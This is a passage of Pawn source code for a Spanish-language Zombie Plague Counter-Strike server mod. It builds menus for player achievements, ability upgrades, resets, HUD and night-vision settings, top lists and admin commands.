	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	
	menu_display(id, menuid)
}
public menu_logros_others(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_logros_class(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve player id
	static buffer[2], dummy, playerid, GCL_H, GCL_Z;
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	playerid = buffer[0]
	
	// Make sure it's still connected
	if(gLogeado[playerid])
	{
		GCL_H = get_count_logros(playerid, LOGRO_HUMAN)
		GCL_Z = get_count_logros(playerid, LOGRO_ZOMBIE)
		
		if(GCL_H > 0 || GCL_Z > 0)
		{
			LOGRO_ID_OTHER = playerid;
			show_menu_logros_class_others(id, LOGRO_ID_OTHER)
		}
	}
	
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}
public show_menu_logros_class_others(id, other)
{
	new menu[128], menuid
	
	// Title
	formatex(menu, charsmax(menu), "\yLOGROS DE %s", g_playername[other])
	menuid = menu_create(menu, "menu_logros_class_others")
	
	menu_additem(menuid, "Humanos", "1")
	menu_additem(menuid, "Zombies", "2")
	
	// Back
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_logros_class_others(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_logros_others(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[2], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)

	LOGRO_CLASS_OTHER = str_to_num(buffer) - 1
	
	menu_destroy(menuid)
	
	show_logros_others(id, LOGRO_ID_OTHER)
	
	return PLUGIN_HANDLED;
}
show_logros_others(id, other)
{
	new menu[1024], lang[64], num[8], i, menuid
	
	formatex(menu, charsmax(menu), "\yLOGROS %s DE %s^n\wLogros %s completados: \y%d\RPág ", LANG_HAB_L[LOGRO_CLASS_OTHER], g_playername[other],
	LANG_HAB_L_M[LOGRO_CLASS_OTHER], 
	get_count_logros(other, LOGRO_CLASS_OTHER))
	
	menuid = menu_create(menu, "menu_logros_others_2")
	
	for(i = 0; i < MAX_LOGROS_CLASS[LOGRO_CLASS_OTHER]; i++)
	{
		ArrayGetString(A_LOGROS_NAMES[LOGRO_CLASS_OTHER], i, lang, charsmax(lang))
		
		formatex(menu, charsmax(menu), "%s%s (%s)", g_logro[other][LOGRO_CLASS_OTHER][i] ? "\w" : "\d", lang, 
		g_logro[other][LOGRO_CLASS_OTHER][i] ? "\yCOMPLETO\w" : "\rINCOMPLETO\d")
		
		num_to_str(i, num, charsmax(num))
		menu_additem(menuid, menu, num)
	}
	
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_logros_others_2(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_logros_class_others(id, LOGRO_ID_OTHER)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	menu_destroy(menuid)
	
	show_logros_others(id, LOGRO_ID_OTHER)
	return PLUGIN_HANDLED;
}




// Habilities Class Menu
show_menu_hab_class(id)
{
	new menu[128], menuid
	
	// Title
	formatex(menu, charsmax(menu), "\yHABILIDADES")
	menuid = menu_create(menu, "menu_hab_class")
	
	menu_additem(menuid, "Humanas", "1")
	menu_additem(menuid, "Zombies", "2")
	menu_additem(menuid, "Survivor", "3")
	menu_additem(menuid, "Nemesis", "4")
	menu_additem(menuid, "Especiales^n", "5")
	
	menu_additem(menuid, "Comprar puntos", "6")
	
	// Back
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}

public menu_hab_class(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[2], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	POINT_CLASS = str_to_num(buffer) - 1
	
	menu_destroy(menuid)
	
	if(POINT_CLASS == 5) 
	{
		CC(id, "!g[ZP]!y Comprá puntos para utilizar en tu cuenta y subí los niveles de tus habilidades!")
		CC(id, "!ghttp://www.taringacs.net/servidores/27025/comprar/")
	}
	else show_menu_hab(id)
	
	return PLUGIN_HANDLED;
}

show_menu_hab(id)
{
	new menu[256], lang[32], num[8], i, menuid, percent
	
	formatex(menu, charsmax(menu), "\y%s^n\wPuntos %s: \y%d%s", LANG_HAB[POINT_CLASS], LANG_HAB_M[POINT_CLASS], gPoints[id][POINT_CLASS], POINT_CLASS == HAB_SPECIAL ? "\RPág " : "")
	menuid = menu_create(menu, "menu_hab")
	
	for(i = 0; i < MAX_HABILITIES[POINT_CLASS]; i++)
	{
		ArrayGetString(A_HAB_NAMES[POINT_CLASS], i, lang, charsmax(lang))
		
		percent = get_percent_upgrade(id, POINT_CLASS, i)
		
		if(POINT_CLASS != HAB_SPECIAL)
		{
			if (percent)
				formatex(menu, charsmax(menu), "%s \y(%d de %d)(+%d%%)%s", lang, g_hab[id][POINT_CLASS][i], ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], i), percent, (i == MAX_HABILITIES[POINT_CLASS]-1) ? "^n" : "")
			else
				formatex(menu, charsmax(menu), "%s \y(%d de %d)%s", lang, g_hab[id][POINT_CLASS][i], ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], i), (i == MAX_HABILITIES[POINT_CLASS]-1) ? "^n" : "")
		}
		else
		{
			if(i < 5)
				formatex(menu, charsmax(menu), "%s \y(100 Puntos)", lang)
			else if(percent)
				formatex(menu, charsmax(menu), "%s \y(%d de %d)(+%d%%)%s", lang, g_hab[id][POINT_CLASS][i], ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], i), percent, (i == MAX_HABILITIES[POINT_CLASS]-1) ? "^n" : "")
			else
				formatex(menu, charsmax(menu), "%s \y(%d de %d)%s", lang, g_hab[id][POINT_CLASS][i], ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], i), (i == MAX_HABILITIES[POINT_CLASS]-1) ? "^n" : "")
		}
		
		num_to_str(i, num, charsmax(num))
		menu_additem(menuid, menu, num)
	}
	
	if(POINT_CLASS != HAB_SPECIAL)
	{
		formatex(menu, charsmax(menu), "Resetear Habilidades \y(5p. E.)")
		menu_additem(menuid, menu, (POINT_CLASS == HAB_HUMAN) ? "6" : (POINT_CLASS == HAB_ZOMBIE) ? "5" : (POINT_CLASS == HAB_SURVIVOR) ? "4" :
		(POINT_CLASS == HAB_NEMESIS) ? "4" : "6", ADMIN_ALL, menu_makecallback("detect_menu_sub_hab1_ps"))
	}
	
	menu_setprop(menuid, MPROP_NEXTNAME, "Siguiente")
	menu_setprop(menuid, MPROP_BACKNAME, "Anterior")
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}

public detect_menu_sub_hab1_ps(id, menuid, item)
{
	if(gPoints[id][HAB_SPECIAL] >= 5 &&
	(g_hab[id][POINT_CLASS][0] > 0 ||
	g_hab[id][POINT_CLASS][1] > 0 ||
	g_hab[id][POINT_CLASS][2] > 0 ||
	g_hab[id][POINT_CLASS][3] > 0 ||
	g_hab[id][POINT_CLASS][4] > 0 ||
	g_hab[id][POINT_CLASS][5] > 0 ||
	g_hab[id][POINT_CLASS][6] > 0 ||
	g_hab[id][POINT_CLASS][7] > 0))
		return ITEM_ENABLED;
	
	return ITEM_DISABLED;
}

public menu_hab(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		show_menu_hab_class(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	POINT_ITEM = str_to_num(buffer)
	
	menu_destroy(menuid)
	
	if(POINT_CLASS == HAB_SPECIAL && POINT_ITEM < 5)
	{
		if(gPoints[id][HAB_SPECIAL] >= 100)
		{
			if(g_newround)
			{
				remove_task(TASK_MAKEZOMBIE)
				
				make_a_zombie(POINT_ITEM==0 ? MODE_SURVIVOR : POINT_ITEM==1 ? MODE_NINJA : POINT_ITEM==2 ? MODE_WESKER : POINT_ITEM==3 ? MODE_NEMESIS : POINT_ITEM==4 ?
				MODE_TROLL : MODE_INFECTION, id)
				
				gPoints[id][HAB_SPECIAL] -= 100
			}
			else
			{
				CC(id, "!g[ZP]!y No puedes comprar modos una vez empezado algún modo.")
				show_menu_hab(id)
			}
		}
		else show_menu_hab(id)
	}
	else sub_menu_hab(id)
	
	return PLUGIN_HANDLED;
}

public sub_menu_hab(id)
{
	new menu[256], lang[32], info[32], menuid, total, current, points, maxlevel, cost
	
	if(POINT_ITEM <= MAX_HABILITIES[POINT_CLASS])
	{
		current = g_hab[id][POINT_CLASS][POINT_ITEM]
		
		cost = (POINT_CLASS == 0 || POINT_CLASS == 1) ? next_point(current) :
		(POINT_CLASS == 2) ? next_point_surv(current) :
		(POINT_CLASS == 3) ? next_point_nem(current) :
		next_point_special(current)
		
		points = gPoints[id][POINT_CLASS]
		
		total = points - cost
		
		maxlevel = ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], POINT_ITEM)
		
		ArrayGetString(A_HAB_NAMES[POINT_CLASS], POINT_ITEM, lang, charsmax(lang))
		
		if (current >= maxlevel) formatex(info, charsmax(info), "\y(LV. MAX)")
		else if (total < 0) formatex(info, charsmax(info), "(\r%d Punto%s\d)", cost, (cost != 1) ? "s" : "")
		else formatex(info, charsmax(info), "\y(%d Punto%s)", cost, (cost != 1) ? "s" : "")
		
		// Title
		formatex(menu, charsmax(menu), "%s (%d de %d)(+%d%%)^nPuntos %s: %d", lang, current, maxlevel, get_percent_upgrade(id, POINT_CLASS, POINT_ITEM), LANG_HAB_M[POINT_CLASS], points)
		
		menuid = menu_create(menu, "menu_sub_hab")
		
		if( current != maxlevel ) formatex(menu, charsmax(menu), "Subir habilidad al nivel %d %s", current+1, info)
		else formatex(menu, charsmax(menu), "Nivel máximo: %d", current)
		menu_additem(menuid, menu, "1", ADMIN_ALL, menu_makecallback("detect_menu_sub_hab1"))
	}
	else
	{
		menuid = menu_create("\y¿ ESTAS SEGURO/A ?", "menu_sub_hab")
		menu_additem(menuid, "Si", "1")
		menu_additem(menuid, "No", "2")
	}
	
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)	
}

public detect_menu_sub_hab1(id, menuid, item)
{
	new cost = (POINT_CLASS == 0 || POINT_CLASS == 1) ? next_point(g_hab[id][POINT_CLASS][POINT_ITEM]) :
	(POINT_CLASS == 2) ? next_point_surv(g_hab[id][POINT_CLASS][POINT_ITEM]) :
	(POINT_CLASS == 3) ? next_point_nem(g_hab[id][POINT_CLASS][POINT_ITEM]) :
	next_point_special(g_hab[id][POINT_CLASS][POINT_ITEM])
	
	if (gPoints[id][POINT_CLASS] >= cost)
	{
		if (g_hab[id][POINT_CLASS][POINT_ITEM] < ArrayGetCell(A_HAB_MAX_LEVEL[POINT_CLASS], POINT_ITEM))
			return ITEM_ENABLED
	}
	
	return ITEM_DISABLED
}

/*public detect_menu_sub_hab2(id, menuid, item)
{
	new current = g_hab[id][POINT_CLASS][POINT_ITEM]
	if (current > 0 && g_ammopacks[id] >= cost_down_point(current))
		return ITEM_ENABLED
	
	return ITEM_DISABLED
}*/

public menu_sub_hab(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_hab(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy, percent
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch (str_to_num(buffer))
	{
		case 1:
		{
			if(POINT_ITEM <= MAX_HABILITIES[POINT_CLASS])
			{
				new lang[32]
				
				gPoints[id][POINT_CLASS] -= (POINT_CLASS == 0 || POINT_CLASS == 1) ? next_point(g_hab[id][POINT_CLASS][POINT_ITEM]) :
				(POINT_CLASS == 2) ? next_point_surv(g_hab[id][POINT_CLASS][POINT_ITEM]) :
				(POINT_CLASS == 3) ? next_point_nem(g_hab[id][POINT_CLASS][POINT_ITEM]) :
				next_point_special(g_hab[id][POINT_CLASS][POINT_ITEM])
				
				g_hab[id][POINT_CLASS][POINT_ITEM]++
				
				ArrayGetString(A_HAB_NAMES[POINT_CLASS], POINT_ITEM, lang, charsmax(lang))
				
				percent = get_percent_upgrade(id, POINT_CLASS, POINT_ITEM)
				
				CC(id, "!g[ZP]!y Subiste !g%s!y al nivel !g%d (+%d%%)!y", lang, g_hab[id][POINT_CLASS][POINT_ITEM], percent)
				
				if((POINT_CLASS == HAB_HUMAN || POINT_CLASS == HAB_ZOMBIE) && g_hab[id][POINT_CLASS][POINT_ITEM] == MAX_HAB_LEVEL[POINT_CLASS][POINT_ITEM] &&
				!g_logro[id][POINT_CLASS][(POINT_CLASS == HAB_HUMAN) ? FULL_HAB_H : FULL_HAB_Z])
				{
					new i_Count = 1;
					for(new a = 0; a < MAX_SPECIAL_HABILITIES; a++)
					{
						if(POINT_ITEM != a)
						{
							if(g_hab[id][POINT_CLASS][a] == MAX_HAB_LEVEL[POINT_CLASS][a])
								i_Count++;
						}
					}
					
					if(i_Count >= MAX_SPECIAL_HABILITIES) // FULL HAB
					{
						fnUpdateLogros(id, (POINT_CLASS == HAB_HUMAN) ? LOGRO_HUMAN : LOGRO_ZOMBIE, (POINT_CLASS == HAB_HUMAN) ? FULL_HAB_H : FULL_HAB_Z)
					}
				}
			}
			else
			{
				new i_PointsG = 0;
				new i_While;
				new i_HabLv;
				new i_HabClass;
				new sz_AddDotPG[15];
				
				for(i_HabClass = 0; i_HabClass < MAX_SPECIAL_HABILITIES; i_HabClass++)
				{
					i_While = g_hab[id][POINT_CLASS][i_HabClass];
					g_hab[id][POINT_CLASS][i_HabClass] = 0;
					i_HabLv = 0;
					
					while(i_While > 0)
					{
						if(POINT_CLASS == HAB_SURVIVOR || POINT_CLASS == HAB_NEMESIS)
						{
							i_PointsG += ((i_HabLv+1) * 11);
						}
						else
						{
							if(i_HabLv == 0) i_PointsG++;
							else i_PointsG += ((i_HabLv * 3) + 1);
						}
						
						i_HabLv++;
						i_While--;
					}
				}
				
				gPoints[id][HAB_SPECIAL] -= 5;
				gPoints[id][POINT_CLASS] += i_PointsG;
				
				AddDot(i_PointsG, sz_AddDotPG, 14)
				CC(id, "!g[ZP]!y Habilidades reseteadas correctamente. Se te han devuelto !g%sp. %s!y", sz_AddDotPG, LANG_HAB_M[POINT_CLASS])
				
				menu_destroy(menuid)
		
				show_menu_hab(id)
				return PLUGIN_HANDLED;
			}
		}
		case 2:
		{
			menu_destroy(menuid)
		
			show_menu_hab(id)
			return PLUGIN_HANDLED;
			
			/*new value = current_point(g_hab[id][POINT_CLASS][POINT_ITEM])
			
			// Rest AP
			g_ammopacks[id] -= cost_down_point(g_hab[id][POINT_CLASS][POINT_ITEM])			
			
			g_hab[id][POINT_CLASS][POINT_ITEM]--
			
			gPoints[id][POINT_CLASS] += value
			
			check_level(id)
			
			percent = get_percent_upgrade(id, POINT_CLASS, POINT_ITEM)
			
			client_print_color(id, Red, "%L", id, "DOWN_POINT", value, g_hab[id][POINT_CLASS][POINT_ITEM], 100 + percent)*/
		}
	}
	
	menu_destroy(menuid)

	sub_menu_hab(id)
	return PLUGIN_HANDLED;
}

// Reset Menu
public show_menu_reset(id)
{
	// Title
	new menuid = menu_create("\yEstás seguro/a que deseas resetear ?:", "menu_reset")
	
	menu_additem(menuid, "Sí", "1", ADMIN_ALL, menu_makecallback("detect_menu_reset"))
	menu_additem(menuid, "No", "2")
	
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}

public detect_menu_reset(id, menuid, item)
{
	if(ReqNeedReset_ASD(id))
		return ITEM_ENABLED;
		
	return ITEM_DISABLED;
}

public menu_reset(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch (str_to_num(buffer))
	{
		case 1:
		{
			gReset[id]++
			gPoints[id][HAB_HUMAN] += 10
			gPoints[id][HAB_ZOMBIE] += 10
			gPoints[id][HAB_SURVIVOR] += 5
			gPoints[id][HAB_NEMESIS] += 5
			gPoints[id][HAB_SPECIAL] += 20
			gLevel[id] = 1
			g_ammopacks[id] = 0
			
			static szResetS[32]; formatex(szResetS, charsmax(szResetS), "S.%d", gReset[id] - 5)
			CC( 0, "!g[ZP]!y Felicitaciones !g%s!y, avanzaste a la !gClase %s!y", g_playername[id], (gReset[id] > 5) ? szResetS : gRESET_CLASS[gReset[id]] )
			
			fnUpdateLogros(id, LOGRO_HUMAN, RESET)
		}
		case 2:
		{
			menu_destroy(menuid)
			show_menu_game(id)
			return PLUGIN_HANDLED;
		}
	}
	
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}

public show_menu_interfaz(id)
{
	// Title
	new menuid = menu_create("\yINTERFAZ", "menu_interfaz")
	
	menu_additem(menuid, "Visión nocturna", "1")
	menu_additem(menuid, "HUD", "2")
	
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}

public menu_interfaz(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	new buffer[3], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch (str_to_num(buffer))
	{
		case 1: show_menu_nvg(id)
		case 2: show_menu_hud(id)
	}
	
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}

public show_menu_nvg(id)
{
	new menuid
	
	// Title
	menuid = menu_create("\yCOLOR DE LA VISION NOCTURNA", "menu_nvg")
	
	menu_additem(menuid, "Blanca", "1")
	menu_additem(menuid, "Roja", "2")
	menu_additem(menuid, "Verde", "3")
	menu_additem(menuid, "Azul", "4")
	menu_additem(menuid, "Amarilla", "5")
	menu_additem(menuid, "Violeta", "6")
	menu_additem(menuid, "Celeste", "7")
	
	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_nvg(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve nvg color
	new buffer[4], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch( str_to_num(buffer) )
	{
		case 1: g_color_nvg[id] = { 255, 255, 255 }
		case 2: g_color_nvg[id] = { 200, 0, 0 }
		case 3: g_color_nvg[id] = { 0, 200, 0 }
		case 4: g_color_nvg[id] = { 0, 0, 200 }
		case 5: g_color_nvg[id] = { 234, 180, 17 }
		case 6: g_color_nvg[id] = { 255, 0, 255 }
		case 7: g_color_nvg[id] = { 0, 255, 255 }
	}
	
	menu_destroy(menuid)
	show_menu_nvg(id)
	return PLUGIN_HANDLED;
}

public show_menu_hud(id)
{
	new menuid
	
	// Title
	menuid = menu_create("\yHUD", "menu_hud")
	
	menu_additem(menuid, "Color", "1")
	menu_additem(menuid, "Posición", "2")

	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_hud(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_game(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve zombie class id
	new buffer[4], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch( str_to_num(buffer) )
	{
		case 1: show_menu_hud_color(id)
		case 2: show_menu_hud_position(id)
	}
	
	menu_destroy(menuid)
	return PLUGIN_HANDLED;
}

public show_menu_hud_color(id)
{
	new menuid
	
	// Title
	menuid = menu_create("\yCOLOR DEL HUD", "menu_hud_color")
	
	menu_additem(menuid, "Blanco", "1")
	menu_additem(menuid, "Rojo", "2")
	menu_additem(menuid, "Verde", "3")
	menu_additem(menuid, "Azul", "4")
	menu_additem(menuid, "Amarillo", "5")
	menu_additem(menuid, "Violeta", "6")
	menu_additem(menuid, "Celeste", "7")

	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_hud_color(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_hud(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve zombie class id
	new buffer[4], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch( str_to_num(buffer) )
	{
		case 1: g_color_hud[id] = { 255, 255, 255 }
		case 2: g_color_hud[id] = { 200, 0, 0 }
		case 3: g_color_hud[id] = { 0, 200, 0 }
		case 4: g_color_hud[id] = { 0, 0, 200 }
		case 5: g_color_hud[id] = { 234, 180, 17 }
		case 6: g_color_hud[id] = { 255, 0, 255 }
		case 7: g_color_hud[id] = { 0, 255, 255 }
	}
	
	menu_destroy(menuid)
	show_menu_hud_color(id)
	return PLUGIN_HANDLED;
}

public show_menu_hud_position(id)
{
	new menuid
	
	// Title
	menuid = menu_create("\yPOSICION DEL HUD", "menu_hud_position")
	
	menu_additem(menuid, "Mover hacia arriba", "1")
	menu_additem(menuid, "Mover hacia abajo^n", "2")
	
	menu_additem(menuid, "Mover hacia la derecha", "3")
	menu_additem(menuid, "Mover hacia la izquierda^n", "4")
	
	menu_additem(menuid, "Alinear a la izquierda", "5")
	menu_additem(menuid, "Alinear al centro^n", "6")
	
	menu_additem(menuid, "Por defecto", "7")

	menu_setprop(menuid, MPROP_EXITNAME, "Volver")
	menu_display(id, menuid)
}
public menu_hud_position(id, menuid, item)
{
	// Menu was closed
	if (item == MENU_EXIT)
	{
		menu_destroy(menuid)
		
		show_menu_hud(id)
		return PLUGIN_HANDLED;
	}
	
	// Retrieve zombie class id
	new buffer[4], dummy
	menu_item_getinfo(menuid, item, dummy, buffer, charsmax(buffer), _, _, dummy)
	
	switch( str_to_num(buffer) )
	{
		case 1: // ARRIBA
		{
			g_hud_xyc[id][2] = g_hud_xyc[id][2] ? 1.0 : 0.0
			g_hud_xyc[id][1] -= 0.01
		}
		case 2: // ABAJO
		{
			g_hud_xyc[id][2] = g_hud_xyc[id][2] ? 1.0 : 0.0
			g_hud_xyc[id][1] += 0.01
		}
		case 3: // DERECHA
		{
			if( g_hud_xyc[id][2] )
			{
				CC(id, "!g[ZP]!y No puedes mover el !gHUD!y hacia la derecha teniendo el !gHUD centrado!y")
				show_menu_hud_position( id )
				return PLUGIN_HANDLED;
			}
			
			g_hud_xyc[id][2] = 0.00
			g_hud_xyc[id][0] += 0.01
		}
		case 4: // IZQUIERDA
		{
			if( g_hud_xyc[id][2] )
			{
				CC(id, "!g[ZP]!y No puedes mover el !gHUD!y hacia la izquierda teniendo el !gHUD centrado!y")
				show_menu_hud_position( id )
				return PLUGIN_HANDLED;
			}
			
			g_hud_xyc[id][2] = 0.00
			g_hud_xyc[id][0] -= 0.01
		}
		case 5: // ALINEAR A LA IZQUIERDA
		{
			g_hud_xyc[id][2] = 0.00
			g_hud_xyc[id][0] = 0.00
		}
		case 6: // CENTRAR
		{
			g_hud_xyc[id][2] = 1.00
			g_hud_xyc[id][0] = -1.00
			//g_hud_xyc[id][1] = -1.00
		}
		case 7: // POR DEFECTO
		{
			g_hud_xyc[id][2] = 0.00
			g_hud_xyc[id][0] = HUD_STATS_X
			g_hud_xyc[id][1] = HUD_STATS_Y
		}
	}
	
	menu_destroy(menuid)
	show_menu_hud_position(id)
	return PLUGIN_HANDLED;
}

// Herramientas Menu
public show_menu_herramientas(id)
{
	if(!g_isconnected[id] || !gLogeado[id])
		return PLUGIN_HANDLED;
	
	static menu[512], len;
	len = 0;
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yHERRAMIENTAS^n^n")
	
	len += formatex(menu[len], charsmax(menu) - len, "\r1.\w Panel de Control^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r2.\w Listado de Jugadores^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r3.\w Tops^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r4.\w Premium")
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, -1, "Herramientas Menu")
	
	return PLUGIN_HANDLED;
}

public menu_herramientas(id, key)
{
	if(!g_isconnected[id] || !gLogeado[id])
		return PLUGIN_HANDLED;
	
	switch(key)
	{
		case 0:
		{
			CC(id, "!g[ZP]!y Vinculá tu cuenta de Zombie-Plague con la de Taringa! CS y accedé al panel de control de tu cuenta!")
			CC(id, "!ghttp://www.taringacs.net/servidores/27025/panel-de-control/")
		}
		case 1:
		{
			CC(id, "!g[ZP]!y Visualizá el listado de todos los jugadores de nuestro servidor Zombie-Plague")
			CC(id, "!ghttp://www.taringacs.net/servidores/27025/listado/")
		}
		case 2: show_menu_tops(id)
		case 3:
		{
			CC(id, "!g[ZP]!y Comprá tu usuario premium y tené grandes beneficios.")
			CC(id, "!gwww.taringacs.net/premium/")
		}
	}
	
	return PLUGIN_HANDLED;
}
public show_menu_tops(id)
{
	if(!g_isconnected[id] || !gLogeado[id])
		return PLUGIN_HANDLED;
	
	static menu[512], len;
	len = 0;
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yTOP 15 - Zombie Plague^n^n")
	
	len += formatex(menu[len], charsmax(menu) - len, "\r1.\w General^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r2.\w Muertes^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r3.\w Infecciones^n")
	len += formatex(menu[len], charsmax(menu) - len, "\r4.\w Daño^n^n")
	
	len += formatex(menu[len], charsmax(menu) - len, "\r5.\w Más")
	
	// 0. Exit
	len += formatex(menu[len], charsmax(menu) - len, "^n^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, -1, "Tops Menu")
	
	return PLUGIN_HANDLED;
}
public menu_tops(id, key)
{
	if(!g_isconnected[id] || !gLogeado[id])
		return PLUGIN_HANDLED;
	
	switch(key)
	{
		case 0: zp_showhtml_motd(id, TOP_GENERAL)
		case 1: zp_showhtml_motd(id, TOP_MUERTES)
		case 2: zp_showhtml_motd(id, TOP_INFECCIONES)
		case 3: zp_showhtml_motd(id, TOP_DANIO)
		case 4: 
		{
			CC(id, "!g[ZP]!y Recordá que podés ver cuando desees desde la web los tops ingresando en")
			CC(id, "!ghttp://www.taringacs.net/servidores/27025/tops/")
		}
	}
	
	return PLUGIN_HANDLED;
}

// Admin Menu
show_menu_admin(id)
{
	static menu[750], len, userflags
	len = 0
	userflags = get_user_flags(id)
	
	// Title
	len += formatex(menu[len], charsmax(menu) - len, "\yMENU DE ADMIN^n^n")
	
	// 1. Zombiefy/Humanize command
	if (userflags & (ACCESS_MODE)) len += formatex(menu[len], charsmax(menu) - len, "\r1.\w Hacer zombie/humano^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d1. Hacer zombie/humano^n")
	
	// 2. Nemesis command
	if (userflags & (ACCESS_MODE)) len += formatex(menu[len], charsmax(menu) - len, "\r2.\w Hacer nemesis^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d2. Modo nemesis^n")
	
	// 3. Survivor command
	if (userflags & (ACCESS_MODE)) len += formatex(menu[len], charsmax(menu) - len, "\r3.\w Hacer survivor^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d3. Modo survivor^n")
	
	// 4. Respawn command
	if (userflags & ACCESS_MODE) len += formatex(menu[len], charsmax(menu) - len, "\r4.\w Revivir a alguien^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d4. Revivir a alguien^n")
	
	// 5. Swarm mode command
	if ((userflags & ACCESS_MODE) && allowed_swarm()) len += formatex(menu[len], charsmax(menu) - len, "\r5.\w Comenzar modo swarm^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d5. Comenzar modo swarm^n")
	
	// 6. Multi infection command
	if ((userflags & ACCESS_MODE) && allowed_multi()) len += formatex(menu[len], charsmax(menu) - len, "\r6.\w Comenzar infección multiple^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d6. Comenzar infección multiple^n")
	
	// 7. Plague mode command
	if ((userflags & ACCESS_MODE) && allowed_plague()) len += formatex(menu[len], charsmax(menu) - len, "\r7.\w Comenzar modo plague^n")
	else len += formatex(menu[len], charsmax(menu) - len, "\d7. Comenzar modo plague^n")
	
	// 8. Armageddon mode command
	if( ( userflags & ACCESS_MODE_2 ) && allowed_swarm() && fnGetAlive() >= 10 )
		len += formatex( menu[len], charsmax(menu) - len, "\r8.\w Comenzar modo armageddon^n" )
	else 
		len += formatex( menu[len], charsmax(menu) - len, "\d8. Comenzar modo armageddon^n" )
	
	// 0. Exit
	len += formatex( menu[len], charsmax(menu) - len, "^n\r9.\w Pagina siguiente" )
	len += formatex(menu[len], charsmax(menu) - len, "^n\r0.\w Salir")
	
	show_menu(id, KEYSMENU, menu, -1, "Admin Menu")
}

// Admin Menu - Page 2
show_menu_admin2(id)
{
	static menu[750], len, userflags
